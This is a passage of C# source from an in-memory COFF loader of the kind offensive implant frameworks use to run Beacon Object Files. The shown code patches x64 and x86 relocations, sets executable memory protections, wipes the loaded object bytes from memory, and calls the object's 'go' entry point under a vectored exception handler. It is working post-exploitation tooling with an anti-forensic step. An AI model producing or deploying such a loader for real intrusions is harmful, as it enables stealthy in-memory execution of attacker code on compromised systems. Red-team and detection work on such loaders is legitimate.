                if (secRelocCnt[si] == 0) continue;
                for (int r = 0; r < secRelocCnt[si]; r++) {
                    int off = secRelocOff[si] + r * 10;
                    if (off + 10 > bof.Length) throw new Exception("Relocation table truncated");
                    uint va     = _RU32(bof, off);
                    uint symIdx = _RU32(bof, off + 4);
                    ushort type = _RU16(bof, off + 8);
                    IntPtr tgt  = (IntPtr)((long)secMem[si] + va);
                    long saL    = (symIdx < (uint)nsym) ? symAddr[symIdx].ToInt64() : 0;
                    long tgtL   = tgt.ToInt64();
                    bool viaK = rxWritten[si];

                    if (is64) {
                        switch (type) {
                            case 0x0000: break;                              // ABSOLUTE
                            case 0x0001: _WriteI64(tgt, saL, viaK); break;   // ADDR64
                            case 0x0002:                                     // ADDR32
                                _WriteI32(tgt, (int)(saL & 0xFFFFFFFF), viaK); break;
                            case 0x0003: break;                              // ADDR32NB
                            case 0x0004: case 0x0005: case 0x0006:
                            case 0x0007: case 0x0008: case 0x0009: {         // REL32..REL32_5
                                int addend = viaK
                                    ? BitConverter.ToInt32(_ReadBytes(tgt, 4), 0)
                                    : Marshal.ReadInt32(tgt);
                                int n = type - 0x0004;
                                long val = saL - (tgtL + 4 + n) + addend;
                                if (val > int.MaxValue || val < int.MinValue)
                                    throw new Exception("REL32 overflow at sec=" + secNames[si] +
                                                        " off=" + va);
                                _WriteI32(tgt, (int)val, viaK);
                                break;
                            }
                            case 0x000A: {                                   // SECTION
                                // The 16-bit section number of the symbol.
                                // Not a delta into the loaded image — the
                                // value is the 1-based index in the COFF
                                // section table, written verbatim.
                                int sn = (symIdx < (uint)nsym)
                                    ? symSecNum[symIdx] : 0;
                                _WriteI32(tgt, sn & 0xFFFF, viaK);
                                break;
                            }
                            case 0x000B: {                                   // SECREL
                                // The 32-bit offset of the symbol within
                                // its section, taken from symVal (the raw
                                // COFF value), not from the resolved
                                // runtime address.
                                int sv = (symIdx < (uint)nsym)
                                    ? (int)symVal[symIdx] : 0;
                                _WriteI32(tgt, sv, viaK);
                                break;
                            }
                            default:
                                throw new Exception("Unsupported x64 reloc: 0x" + type.ToString("X4"));
                        }
                    } else {
                        switch (type) {
                            case 0x0000: break;                              // I386_ABSOLUTE
                            case 0x0006:                                     // I386_DIR32
                                _WriteI32(tgt, (int)(saL & 0xFFFFFFFF), viaK); break;
                            case 0x0007: break;                              // I386_DIR32NB
                            case 0x000A: break;                              // I386_SECTION
                            case 0x000B: break;                              // I386_SECREL
                            case 0x0014: {                                   // I386_REL32
                                int addend = viaK
                                    ? BitConverter.ToInt32(_ReadBytes(tgt, 4), 0)
                                    : Marshal.ReadInt32(tgt);
                                long val = saL - (tgtL + 4) + addend;
                                if (val > int.MaxValue || val < int.MinValue)
                                    throw new Exception("REL32 overflow at sec=" + secNames[si] +
                                                        " off=" + va);
                                _WriteI32(tgt, (int)val, viaK);
                                break;
                            }
                            default:
                                throw new Exception("Unsupported x86 reloc: 0x" + type.ToString("X4"));
                        }
                    }
                }
            }

            // ---- 7. Finalize section protections ----
            // Executable sections: RX (or already RX if rxWritten).
            // Read-only data: R. Writable data: RW (left alone).
            for (int i = 0; i < nsec; i++) {
                bool exec = (secChars[i] & IMAGE_SCN_MEM_EXECUTE) != 0;
                if (exec) {
                    if (!rxWritten[i]) {
                        uint old;
                        VirtualProtect(secMem[i], (UIntPtr)secAllocSize[i],
                                       PAGE_EXECUTE_READ, out old);
                    }
                } else {
                    uint finalProt = _FinalProt(secChars[i]);
                    if (finalProt != PAGE_READWRITE) {
                        uint old;
                        VirtualProtect(secMem[i], (UIntPtr)secAllocSize[i],
                                       finalProt, out old);
                    }
                }
            }

            // ---- 8. Zero the COFF bytes from managed memory ----
            Array.Clear(bof, 0, bof.Length);

            // ---- 9. Find entry point ----
            IntPtr entry = IntPtr.Zero;
            string[] candidates = is64
                ? new string[] { entryName, "go", "_go" }
                : new string[] { entryName, "_go", "go" };
            foreach (string cand in candidates) {
                for (int i = 0; i < nsym; i++) {
                    if (symNames[i] == cand && symAddr[i] != IntPtr.Zero) {
                        entry = symAddr[i];
                        break;
                    }
                }
                if (entry != IntPtr.Zero) break;
            }
            if (entry == IntPtr.Zero)
                throw new Exception("Entry point not found (tried: " +
                                    entryName + ", go, _go)");

            // ---- 10. Arguments ----
            int argsLen = (packedArgs != null) ? packedArgs.Length : 0;
            int allocLen = Math.Max(argsLen, 1);
            IntPtr argsPtr = VirtualAlloc(IntPtr.Zero, (UIntPtr)allocLen,
                                          MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (argsPtr == IntPtr.Zero)
                throw new Exception("VirtualAlloc args failed");

            IntPtr veh = IntPtr.Zero;
            try {
                if (argsLen > 0) Marshal.Copy(packedArgs, 0, argsPtr, argsLen);

                // ---- 11. Invoke under a vectored exception handler ----
                _vehFired = 0;
                veh = AddVectoredExceptionHandler(1, Marshal.GetFunctionPointerForDelegate(_vehDel));

                BofEntry fn = (BofEntry)Marshal.GetDelegateForFunctionPointer(
                    entry, typeof(BofEntry));
                try {
                    fn(argsPtr, argsLen);
                } catch (Exception ex) {
                    _AppendOut("\n[BOF exception] " + ex.Message + "\n");
                }
                if (_vehFired != 0)
                    _AppendOut("\n[BOF raised a native exception; outcome decided by host SEH chain]\n");
            } finally {
                if (veh != IntPtr.Zero) RemoveVectoredExceptionHandler(veh);
                VirtualFree(argsPtr, UIntPtr.Zero, MEM_RELEASE);
                // Zero the argument buffer before releasing (defensive).
                if (argsLen > 0) Array.Clear(packedArgs, 0, packedArgs.Length);
            }

        } finally {
            if (blob != IntPtr.Zero) VirtualFree(blob, UIntPtr.Zero, MEM_RELEASE);
            foreach (IntPtr p in _fmtAllocs) {
                if (p != IntPtr.Zero) VirtualFree(p, UIntPtr.Zero, MEM_RELEASE);
            }
            _fmtAllocs.Clear();
            _kv.Clear();
        }

        return _out.ToString().Split(new char[] { '\n' }, StringSplitOptions.RemoveEmptyEntries);
    }

    // Read N bytes from an address (works on RX pages).
    static byte[] _ReadBytes(IntPtr addr, int n) {
        byte[] b = new byte[n];
        Marshal.Copy(addr, b, 0, n);
        return b;
    }
}